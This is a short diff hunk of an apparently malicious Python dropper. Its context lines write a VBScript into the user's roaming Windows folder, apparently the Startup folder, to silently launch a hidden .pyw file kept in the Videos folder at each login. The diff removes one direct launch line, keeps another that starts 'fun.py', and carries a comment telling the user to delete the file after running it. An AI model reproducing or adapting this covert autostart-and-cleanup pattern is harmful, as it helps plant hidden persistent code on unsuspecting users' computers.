@@ -24,7 +24,6 @@ with open(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows
     file.write(f'CreateObject("Wscript.Shell").Run "pythonw C:\\Users\\{getpass.getuser()}\\Videos\\file.pyw",0,True')
 
 
-os.system('pythonw "C:\\Users\\{getpass.getuser()}\\Videos\\file.pyw"')
 os.system('start python fun.py')
 
 # delete this file after running it
